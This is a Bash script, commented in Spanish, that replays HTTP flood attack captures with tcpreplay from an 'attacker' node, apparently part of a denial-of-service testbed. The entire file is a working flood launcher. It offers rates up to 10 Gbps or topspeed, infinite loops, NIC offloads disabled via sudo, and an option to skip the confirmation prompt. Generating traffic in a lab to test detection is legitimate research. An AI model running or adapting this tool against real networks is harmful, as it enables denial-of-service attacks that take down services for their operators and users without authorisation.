#!/bin/bash
#
# Script para reproducir ataques HTTP flood con tcpreplay
# Ejecutar desde nodo Atacante
#

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuración
PCAP_FILE=""
INTERFACE=""
RATE_MBPS=1000
LOOP_COUNT=0
TOPSPEED=false
PRELOAD=false
QUIET=false

usage() {
    cat << EOF
${RED}=== HTTP Flood Attack Replayer ===${NC}

Uso: $0 -i <interface> -f <pcap_file> [opciones]

Opciones:
  -i <interface>      Interfaz de red (obligatorio)
  -f <pcap_file>      Archivo PCAP de ataque (obligatorio)
  -r <rate_mbps>      Tasa en Mbps (default: 1000)
  -m <multiplier>     Multiplicador de velocidad
  -t                  Modo topspeed (máxima velocidad)
  -l <count>          Loops (0 = infinito, default: 0)
  -p                  Preload PCAP en RAM
  -q                  Quiet mode (sin confirmación)

Ejemplos:
  # Ataque básico a 1 Gbps
  $0 -i eth0 -f attack_mixed.pcap -r 1000 -q

  # Ataque intenso a 10 Gbps
  $0 -i eth0 -f attack_high.pcap -r 10000 -q

  # Ataque máximo (topspeed)
  $0 -i eth0 -f attack_extreme.pcap -t -q

EOF
    exit 1
}

# Parsear argumentos
while getopts "i:f:r:m:l:tpqh" opt; do
    case $opt in
        i) INTERFACE="$OPTARG" ;;
        f) PCAP_FILE="$OPTARG" ;;
        r) RATE_MBPS="$OPTARG" ;;
        m) MULTIPLIER="$OPTARG" ;;
        l) LOOP_COUNT="$OPTARG" ;;
        t) TOPSPEED=true ;;
        p) PRELOAD=true ;;
        q) QUIET=true ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Validaciones
if [ -z "$INTERFACE" ] || [ -z "$PCAP_FILE" ]; then
    echo -e "${RED}Error: -i y -f son obligatorios${NC}"
    usage
fi

if [ ! -f "$PCAP_FILE" ]; then
    echo -e "${RED}Error: Archivo no encontrado: $PCAP_FILE${NC}"
    exit 1
fi

if ! command -v tcpreplay &> /dev/null; then
    echo -e "${RED}Error: tcpreplay no instalado${NC}"
    exit 1
fi

# Información
echo -e "${RED}=== HTTP Flood Attack Replay ===${NC}"
echo "Archivo PCAP:     $PCAP_FILE"
echo "Interfaz:         $INTERFACE"

PCAP_SIZE=$(stat -c%s "$PCAP_FILE" 2>/dev/null || stat -f%z "$PCAP_FILE" 2>/dev/null)
PCAP_SIZE_MB=$(echo "scale=2; $PCAP_SIZE / 1024 / 1024" | bc)
echo "Tamaño PCAP:      ${PCAP_SIZE_MB} MB"

# Construir comando
TCPREPLAY_CMD="tcpreplay -i $INTERFACE"

if [ "$TOPSPEED" = true ]; then
    TCPREPLAY_CMD="$TCPREPLAY_CMD --topspeed"
    echo "Modo:             Topspeed (máxima velocidad)"
elif [ -n "$MULTIPLIER" ]; then
    TCPREPLAY_CMD="$TCPREPLAY_CMD --multiplier=$MULTIPLIER"
    echo "Multiplicador:    ${MULTIPLIER}x"
else
    TCPREPLAY_CMD="$TCPREPLAY_CMD --mbps=$RATE_MBPS"
    echo "Tasa objetivo:    $RATE_MBPS Mbps ($(echo "scale=2; $RATE_MBPS / 1000" | bc) Gbps)"
fi

if [ "$LOOP_COUNT" -eq 0 ]; then
    TCPREPLAY_CMD="$TCPREPLAY_CMD --loop=0"
    echo "Loops:            Infinito (Ctrl+C para detener)"
elif [ "$LOOP_COUNT" -gt 1 ]; then
    TCPREPLAY_CMD="$TCPREPLAY_CMD --loop=$LOOP_COUNT"
    echo "Loops:            $LOOP_COUNT"
fi

if [ "$PRELOAD" = true ]; then
    TCPREPLAY_CMD="$TCPREPLAY_CMD --preload-pcap"
fi

TCPREPLAY_CMD="$TCPREPLAY_CMD --timer=nano --stats=1"

echo -e "${RED}===================================${NC}\n"

# Verificar interfaz
if ! ip link show "$INTERFACE" &> /dev/null; then
    echo -e "${RED}Error: Interfaz $INTERFACE no encontrada${NC}"
    exit 1
fi

LINK_STATE=$(cat /sys/class/net/$INTERFACE/operstate 2>/dev/null || echo "unknown")
if [ "$LINK_STATE" != "up" ]; then
    echo -e "${YELLOW}[!] Levantando interfaz...${NC}"
    sudo ip link set $INTERFACE up
    sleep 1
fi

echo -e "${GREEN}[✓] Interfaz $INTERFACE UP${NC}"

# Optimizaciones
sudo ethtool -K $INTERFACE gro off gso off tso off 2>/dev/null && \
    echo -e "${GREEN}[✓] Offloads deshabilitados${NC}" || \
    echo -e "${YELLOW}[!] No se pudieron deshabilitar offloads${NC}"

echo -e "\n${RED}[*] Comando:${NC}"
echo "    $TCPREPLAY_CMD $PCAP_FILE"
echo ""

if [ "$QUIET" = false ]; then
    echo -e "${YELLOW}Presiona Enter para lanzar ataque...${NC}"
    read
fi

echo -e "${RED}[*] Lanzando ataque HTTP flood...${NC}\n"
echo -e "${RED}=== Estadísticas de Ataque ===${NC}"

trap 'echo -e "\n${YELLOW}[!] Ataque detenido${NC}"; exit 0' INT TERM

$TCPREPLAY_CMD "$PCAP_FILE"

echo -e "\n${GREEN}[✓] Ataque completado${NC}"
